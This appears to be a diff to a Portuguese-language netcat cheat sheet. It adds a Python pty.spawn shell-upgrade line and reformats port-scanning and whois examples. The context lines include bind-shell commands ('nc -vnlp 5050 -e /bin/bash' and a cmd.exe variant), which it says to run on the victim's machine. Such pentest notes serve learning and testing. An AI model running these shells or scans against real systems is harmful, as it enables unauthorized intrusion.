@@ -16,17 +16,17 @@ Pode ser usado: nc | ncat | netcat.
 
 ``nc -vnlp 5050 -e /bin/bash`` ==> Executa o /bin/bash  
 ``nc -vnlp 5050 -e cmd.exe`` ==> Executa o CMD  
-*Os dois comandos acima são um modelo de shell simples onde devem ser executadas na máquina da vítima.*
+*Os dois comandos acima são um modelo de shell simples onde devem ser executadas na máquina da vítima.*  
+``python -c 'import pty; pty.spawn("/bin/bash")'`` ==> Abre uma shell mais elaborada quando já estiver conectado ao alvo via NC.  
 
 Escaneando portas:  
 ``nc -vnz 172.16.1.5 19-30`` Será escaneado da porta 19 atá a 30.  
-``nc -vnz 172.16.1.5 22`` Será escaneado somente a porta 22.
-``nc -vnz -w2 172.16.1.5 22`` Será escaneado levando em consideração o Timeout de 2 segundos [-w2].
-``nc -vnzu -w 172.16.1.5 22`` Será feito o escaneamento UDP [u].
+``nc -vnz 172.16.1.5 22`` Será escaneado somente a porta 22.  
+``nc -vnz -w2 172.16.1.5 22`` Será escaneado levando em consideração o Timeout de 2 segundos [-w2].  
+``nc -vnzu -w 172.16.1.5 22`` Será feito o escaneamento UDP [u].  
 
 Vericando whois pelo NC:  
-``nc -v 200.160.2.3 43  
-globo.com``
+``nc -v 200.160.2.3 43 globo.com``
 * A porta 43 é utilizada pelo WHOIS.
 * O IP 200.160.2.3 é do registro.br.
 
